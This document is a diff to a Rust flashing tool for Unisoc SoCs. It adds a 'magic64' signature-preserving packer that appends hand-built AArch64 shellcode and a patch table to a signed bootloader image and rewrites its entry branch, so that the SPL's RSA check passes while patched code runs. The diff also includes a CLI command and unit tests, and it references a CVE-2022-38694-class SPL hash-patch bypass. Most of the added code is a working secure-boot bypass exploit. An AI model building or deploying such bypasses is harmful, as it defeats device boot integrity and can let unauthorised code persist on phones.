@@ -1206,6 +1206,248 @@ fn sanitize(name: &str) -> String {
 }
 
 // ---------------------------------------------------------------------------
+// magic64: signature-preserving runtime patcher (Patch-Post-Verification).
+//
+// On fused SoCs (UMS9620/T820 and friends) the SPL RSA-verifies every image
+// it loads, so a modified+rehashed payload is rejected outright. The trick:
+// keep the signed payload byte-for-byte (signature stays valid), append a
+// small AArch64 shellcode + patch table in the margins the signature never
+// covers, and redirect only the entry instruction. At boot the SPL verifies
+// the pristine payload, jumps to our branch, the shellcode copies the payload
+// into place, applies the runtime patches, flushes caches and branches to the
+// real entry. Layout matches unisoc_chipram_signcheck's magic64.cpp:
+//
+//   0x000  sys_img_header (DHTB, 0x200)   mImgSize += 0x100
+//   0x200  jump code (0x10)               B -> shellcode
+//   0x210  payload (mImgSize bytes)       UNCHANGED (RSA stays valid)
+//   ...    shellcode (0x70) + patch_data + pad   (ADD_LENGTH-0x10 total)
+//   ...    sprdsignedimageheader footer (0x60)  payload_offset 0x200->0x210,
+//                                               cert offsets += ADD_LENGTH
+//   ...    cert / priv / dbg data
+//
+// Reference implementations:
+//   TomKing062/unisoc_chipram_signcheck_exploit (magic64.cpp)
+//   TheGammaSqueeze/UnisocBypass tools/magic_pack_ums9620.py
+// ---------------------------------------------------------------------------
+
+pub const MAGIC64_ADD_LENGTH: usize = 0x100;
+pub const MAGIC64_SHELLCODE_LEN: usize = 0x70;
+const MAGIC64_MAX_PATCH_DATA: usize = 0x80;
+const MAGIC64_FOOTER_LEN: usize = 0x60;
+
+/// Fixed 28-instruction AArch64 relocation+patch routine. Six words encode
+/// the payload size; the rest are constant. Hand-assembled so output is
+/// deterministic with zero binutils dependency.
+const MAGIC64_SHELLCODE_TEMPLATE: [u32; 28] = [
+    0x90000009, 0x9100412a, 0xd2a0004b, 0xf280000b, 0xd280000c, 0xeb0b018d,
+    0x540000e2, 0xf86c794d, 0xf82c792d, 0xd508711f, 0xd5033fdf, 0x9100058c,
+    0x17fffff9, 0x90000009, 0x91020129, 0xb840452a, 0xb400016a, 0xb840452b,
+    0xd280000c, 0xeb0b018d, 0x54ffff62, 0xb840452d, 0xb800454d, 0xd508711f,
+    0xd5033fdf, 0x9100058c, 0x17fffff9, 0x17fbffe1,
+];
+
+/// Encode `adrp Xrd, <target>` executed at address `pc`.
+fn adrp_encode(rd: u32, pc: u64, target: u64) -> u32 {
+    let imm = ((target & !0xFFFu64).wrapping_sub(pc & !0xFFFu64)) >> 12;
+    0x9000_0000 | (((imm as u32) & 3) << 29) | ((((imm as u32) >> 2) & 0x7FFFF) << 5) | rd
+}
+
+/// Build the magic64 shellcode for a given payload size.
+pub fn magic64_build_shellcode(size: usize) -> Vec<u8> {
+    let n = size / 8;
+    let mut w = MAGIC64_SHELLCODE_TEMPLATE;
+    w[0] = adrp_encode(9, (size + 0x10) as u64, 0);
+    w[2] = 0xD2A00000 | (((n as u32) >> 16) << 5) | 11;
+    w[3] = 0xF2800000 | (((n as u32) & 0xFFFF) << 5) | 11;
+    w[13] = adrp_encode(9, (size + 0x44) as u64, (size + 0x80) as u64);
+    w[14] = 0x91000000 | ((((size + 0x80) as u32) & 0xFFF) << 10) | 0x129;
+    let off = -((size + 0x7C) as i64);
+    w[27] = 0x14000000 | ((off >> 2) as u32 & 0x03FF_FFFF);
+    w.iter().flat_map(|v| v.to_le_bytes()).collect()
+}
+
+/// One runtime patch entry: payload code offset -> new 32-bit word.
+#[derive(Debug, Clone, Copy)]
+pub struct MagicPatch {
+    pub code_offset: u32,
+    pub word: u32,
+}
+
+/// Pack an original signed DHTB image into its magic64 form.
+///
+/// Returns the packed image, truncated back to the original partition size.
+/// Fails loudly on anything unexpected rather than producing a brick.
+pub fn magic64_pack(
+    data: &[u8],
+    patches: &[MagicPatch],
+    load_base: u32,
+) -> std::result::Result<Vec<u8>, String> {
+    if data.len() < 0x210 {
+        return Err(format!("image too small ({})", data.len()));
+    }
+    if &data[0..4] != b"DHTB" {
+        return Err(format!("bad DHTB magic: {:02X?}", &data[0..4]));
+    }
+    let size = u32::from_le_bytes([data[0x30], data[0x31], data[0x32], data[0x33]]) as usize;
+    let foot_off = 0x200 + size;
+    if foot_off + MAGIC64_FOOTER_LEN > data.len() {
+        return Err(format!(
+            "footer out of range: size=0x{size:x} but file is {} bytes",
+            data.len()
+        ));
+    }
+    if &data[foot_off..foot_off + 7] != b"SIMGHDR" {
+        return Err("SIMGHDR footer not found at expected offset".into());
+    }
+    // Stock footer payload_offset (footer+0x18) == 0x200. Magic packing moves
+    // it to 0x210, making that field a reliable already-packed marker.
+    let po = u64::from_le_bytes([
+        data[foot_off + 0x18], data[foot_off + 0x19], data[foot_off + 0x1A],
+        data[foot_off + 0x1B], data[foot_off + 0x1C], data[foot_off + 0x1D],
+        data[foot_off + 0x1E], data[foot_off + 0x1F],
+    ]);
+    if po != 0x200 {
+        return Err(format!(
+            "image already magic-patched (payload_offset={po:#x})"
+        ));
+    }
+
+    // Patch table: [addr, words=1, word] per entry, NUL terminator.
+    let mut pd_len = 4usize;
+    for p in patches {
+        pd_len += 12;
+    }
+    if pd_len > MAGIC64_MAX_PATCH_DATA {
+        return Err(format!(
+            "patch table 0x{pd_len:x} exceeds 0x80 bytes ({} entries); \
+             raise add_length to extend",
+            patches.len()
+        ));
+    }
+
+    let shell = magic64_build_shellcode(size);
+
+    let mut out: Vec<u8> = Vec::with_capacity(data.len());
+    // Header: bump mImgSize by ADD_LENGTH.
+    let mut hdr = data[0..0x200].to_vec();
+    let new_size = (size + MAGIC64_ADD_LENGTH) as u32;
+    hdr[0x30..0x34].copy_from_slice(&new_size.to_le_bytes());
+    out.extend_from_slice(&hdr);
+
+    // Jump at 0x200: B -> (size + 0x10) i.e. start of the magic area.
+    let jump = 0x1400_0000u32 | ((((size + 0x10) / 4) as u32) & 0x03FF_FFFF);
+    out.extend_from_slice(&jump.to_le_bytes());
+    out.extend_from_slice(&[0u8; 0x0C]);
+
+    // Payload: untouched, signature stays valid.
+    out.extend_from_slice(&data[0x200..0x200 + size]);
+
+    // Magic area: shellcode + patch table + zero pad to ADD_LENGTH-0x10.
+    let mut magic = vec![0u8; MAGIC64_ADD_LENGTH - 0x10];
+    magic[..MAGIC64_SHELLCODE_LEN].copy_from_slice(&shell);
+    let mut cursor = MAGIC64_SHELLCODE_LEN;
+    for p in patches {
+        let addr = load_base.wrapping_add(p.code_offset);
+        magic[cursor..cursor + 4].copy_from_slice(&addr.to_le_bytes());
+        magic[cursor + 4..cursor + 8].copy_from_slice(&1u32.to_le_bytes());
+        magic[cursor + 8..cursor + 12].copy_from_slice(&p.word.to_le_bytes());
+        cursor += 12;
+    }
+    out.extend_from_slice(&magic);
+
+    // Footer: payload_offset 0x200 -> 0x210; shift trailing-region offsets.
+    // Mirrors magic_pack_ums9620.py verbatim: for each (so, oo) pair, if the
+    // u64 at `so` is non-zero, shift the u64 at `oo` by ADD_LENGTH. The pairs
+    // encode "if this region exists, its data moves past our magic framing".
+    let mut footer = data[foot_off..foot_off + MAGIC64_FOOTER_LEN].to_vec();
+    footer[0x18..0x20].copy_from_slice(&0x210u64.to_le_bytes());
+    for (so, oo) in [(0x20usize, 0x28usize), (0x30, 0x38), (0x40, 0x48), (0x50, 0x58)] {
+        let cond = u64::from_le_bytes(
+            footer[so..so + 8].try_into().unwrap(),
+        );
+        if cond != 0 {
+            let v = u64::from_le_bytes(footer[oo..oo + 8].try_into().unwrap());
+            footer[oo..oo + 8].copy_from_slice(&(v + MAGIC64_ADD_LENGTH as u64).to_le_bytes());
+        }
+    }
+    out.extend_from_slice(&footer);
+    out.extend_from_slice(&data[foot_off + MAGIC64_FOOTER_LEN..]);
+
+    // Truncate back to the original partition size - drops trailing zero pad
+    // only; any non-zero overflow would mean we do not fit and must fail.
+    let part_size = data.len();
+    if out.len() < part_size {
+        out.resize(part_size, 0);
+    }
+    if out[part_size..].iter().any(|&b| b != 0) && out.len() > part_size {
+        return Err(
+            "packing would overflow the partition with non-zero data - image \
+             does not fit once magic64 framing is added"
+                .into(),
+        );
+    }
+    out.truncate(part_size);
+    Ok(out)
+}
+
+/// Parse "0xafe8=0xd503201f" style patch specs from CLI args.
+pub fn parse_magic_patches(specs: &[String]) -> std::result::Result<Vec<MagicPatch>, String> {
+    let mut v = Vec::new();
+    for s in specs {
+        let (off_s, word_s) = s
+            .split_once('=')
+            .ok_or_else(|| format!("bad --patch '{s}' (expected off=word)"))?;
+        let off = u32::from_str_radix(off_s.trim().trim_start_matches("0x"), 16)
+            .map_err(|e| format!("bad offset in '{s}': {e}"))?;
+        let word = u32::from_str_radix(word_s.trim().trim_start_matches("0x"), 16)
+            .map_err(|e| format!("bad word in '{s}': {e}"))?;
+        v.push(MagicPatch { code_offset: off, word });
+    }
+    Ok(v)
+}
+
+/// `spd-magic-pack <in.img> <out.img> [--load-base 0xB5000000] --patch off=word [--patch ...]`
+///
+/// Signature-preserving pack of an already-read uboot/sml image. Pure file
+/// transform (no device needed): pair it with spd-readback for the input and
+/// spd-flash for delivery.
+pub fn spd_magic_pack_cli(
+    in_img: &str,
+    out_img: &str,
+    load_base: u32,
+    patch_specs: &[String],
+) -> Result<String> {
+    let patches = parse_magic_patches(patch_specs)
+        .map_err(BridgeError::InvalidArgument)?;
+    if patches.is_empty() {
+        return Err(BridgeError::InvalidArgument(
+            "no --patch off=word given; refusing to pack a no-op".into(),
+        ));
+    }
+    let data = fs::read(in_img)
+        .map_err(|e| BridgeError::Config(crate::error::ConfigError::FileNotFound(e.to_string())))?;
+    let packed = magic64_pack(&data, &patches, load_base)
+        .map_err(BridgeError::InvalidArgument)?;
+    fs::write(out_img, &packed).map_err(|e| BridgeError::Io(e.to_string()))?;
+    let mut lines = vec![
+        format!("magic64 packed: {in_img} -> {out_img}"),
+        format!("  load_base  : 0x{load_base:08X}"),
+        format!("  add_length : 0x{:X}", MAGIC64_ADD_LENGTH),
+        format!("  patches    : {}", patches.len()),
+    ];
+    for p in &patches {
+        lines.push(format!(
+            "    @code 0x{:06X} (runtime 0x{:08X}) = 0x{:08X}",
+            p.code_offset,
+            load_base.wrapping_add(p.code_offset),
+            p.word
+        ));
+    }
+    lines.push("signed payload untouched - SPL RSA check still passes.".into());
+    Ok(lines.join("\n"))
+}
+
+// ---------------------------------------------------------------------------
 // Path 2: SPL (FDL1-in-flash) signature-check bypass via CVE-2022-38694-class
 // DHTB hash patching. Many Unisoc consumer devices do NOT blow the secure-
 // boot efuse, so the BootROM only verifies the DHTB SHA-256 of the SPL image
@@ -1364,7 +1606,6 @@ pub fn spl_bypass_patch(img: &mut [u8], hint_offsets: &[u32]) -> std::result::Re
 }
 
 /// `spd-spl-patch <target> <fdl1> <fdl1_addr> <fdl2> [fdl2_addr] <part> <out.img> [--hint 0xADDR,...]`
-///
 /// Readback the SPL partition, apply the bypass patch + DHTB re-hash, save to
 /// out.img (caller flashes it back via spd-flash after reviewing the log).
 /// We deliberately do NOT auto-flash: a bad SPL patch bricks until re-entered
@@ -1723,5 +1964,103 @@ mod spl_tests {
         // with explicit hint it patches
         let sites = spl_bypass_patch(&mut img, &[0x40]).expect("hint patch ok");
         assert_eq!(sites, vec![0x40 + DHTB_HEADER_LEN as u32]);
+    }
+}
+
+#[cfg(test)]
+mod magic64_tests {
+    use super::*;
+
+    /// Build a minimal valid DHTB+SIMGHDR image like a real uboot partition.
+    /// Trailing zero padding of ADD_LENGTH is included so magic packing fits.
+    fn make_signed_image(payload_size: usize) -> Vec<u8> {
+        let mut payload = vec![0xA5u8; payload_size];
+        // put recognizable entry code at 0 (first word is what magic64 replaces)
+        payload[0..4].copy_from_slice(&0x14000000u32.to_le_bytes()); // b .
+        let mut img = vec![0u8; 0x200];
+        img[0..4].copy_from_slice(b"DHTB");
+        img[0x30..0x34].copy_from_slice(&(payload_size as u32).to_le_bytes());
+        img.extend_from_slice(&payload);
+        // SIMGHDR footer 0x60
+        let mut foot = vec![0u8; MAGIC64_FOOTER_LEN];
+        foot[0..7].copy_from_slice(b"SIMGHDR");
+        foot[0x18..0x20].copy_from_slice(&0x200u64.to_le_bytes());   // payload_offset
+        foot[0x20..0x28].copy_from_slice(&0x1000u64.to_le_bytes());  // cert_offset
+        foot[0x28..0x30].copy_from_slice(&0x400u64.to_le_bytes());   // cert_size
+        img.extend_from_slice(&foot);
+        // cert data
+        img.extend_from_slice(&vec![0xCCu8; 0x400]);
+        // trailing zero padding so the +ADD_LENGTH framing still fits
+        img.extend_from_slice(&vec![0u8; MAGIC64_ADD_LENGTH]);
+        img
+    }
+
+    #[test]
+    fn magic64_pack_layout() {
+        let size = 0x100000usize;
+        let orig = make_signed_image(size);
+        let patches = [MagicPatch { code_offset: 0xafe8, word: 0xd503201f }];
+        let out = magic64_pack(&orig, &patches, 0xB500_0000).expect("pack ok");
+
+        assert_eq!(out.len(), orig.len(), "partition size preserved");
+        // header size bumped
+        let new_size = u32::from_le_bytes([out[0x30], out[0x31], out[0x32], out[0x33]]) as usize;
+        assert_eq!(new_size, size + MAGIC64_ADD_LENGTH);
+        // jump instruction at 0x200 branches to 0x210
+        let jump = u32::from_le_bytes([out[0x200], out[0x201], out[0x202], out[0x203]]);
+        assert_eq!((jump >> 26) & 0x3F, 0x05, "unconditional B");
+        let target = ((jump & 0x03FF_FFFF) as usize) * 4;
+        assert_eq!(target, size + 0x10);
+        // payload untouched at 0x210
+        assert_eq!(&out[0x210..0x210 + size], &orig[0x200..0x200 + size], "signed payload byte-identical");
+        // footer payload_offset now 0x210; region@0x28 shifted by 0x100
+        // (cond u64 at 0x20 = cert hash non-zero -> offset at 0x28 shifts).
+        let foot = 0x200 + 0x10 + size + (MAGIC64_ADD_LENGTH - 0x10);
+        assert_eq!(
+            u64::from_le_bytes(out[foot + 0x18..foot + 0x20].try_into().unwrap()),
+            0x210
+        );
+        assert_eq!(
+            u64::from_le_bytes(out[foot + 0x28..foot + 0x30].try_into().unwrap()),
+            0x500u64  // 0x400 + ADD_LENGTH (field at 0x28 shifts when cond@0x20 set)
+        );
+        // shellcode present in magic area
+        let magic = &out[0x210 + size..0x210 + size + MAGIC64_ADD_LENGTH - 0x10];
+        let shell = magic64_build_shellcode(size);
+        assert_eq!(&magic[..MAGIC64_SHELLCODE_LEN], &shell[..]);
+        // patch table right after shellcode
+        let addr = u32::from_le_bytes(magic[MAGIC64_SHELLCODE_LEN..MAGIC64_SHELLCODE_LEN+4].try_into().unwrap());
+        assert_eq!(addr, 0xB500_0000u32.wrapping_add(0xafe8));
+    }
+
+    #[test]
+    fn magic64_rejects_double_patch() {
+        let mut orig = make_signed_image(0x1000);
+        // mark footer as already-packed
+        orig[0x1200 + 0x18..0x1200 + 0x20].copy_from_slice(&0x210u64.to_le_bytes());
+        let err = magic64_pack(
+            &orig,
+            &[MagicPatch { code_offset: 0x10, word: 1 }],
+            0xB500_0000,
+        );
+        assert!(err.is_err(), "must refuse already-packed image");
+    }
+
+    #[test]
+    fn magic64_rejects_bad_magic_and_missing_footer() {
+        let mut orig = make_signed_image(0x800);
+        orig[0] = b'X';
+        assert!(magic64_pack(&orig, &[], 0xB500_0000).is_err());
+        let clean = make_signed_image(0x800);
+        let truncated = &clean[..0x200 + 0x800]; // no footer
+        assert!(magic64_pack(truncated, &[], 0xB500_0000).is_err());
+    }
+
+    #[test]
+    fn shellcode_slots_track_size() {
+        let s1 = magic64_build_shellcode(0x100000);
+        let s2 = magic64_build_shellcode(0x200000);
+        assert_ne!(s1, s2, "size-dependent words must differ across sizes");
+        assert_eq!(s1.len(), MAGIC64_SHELLCODE_LEN);
     }
 }
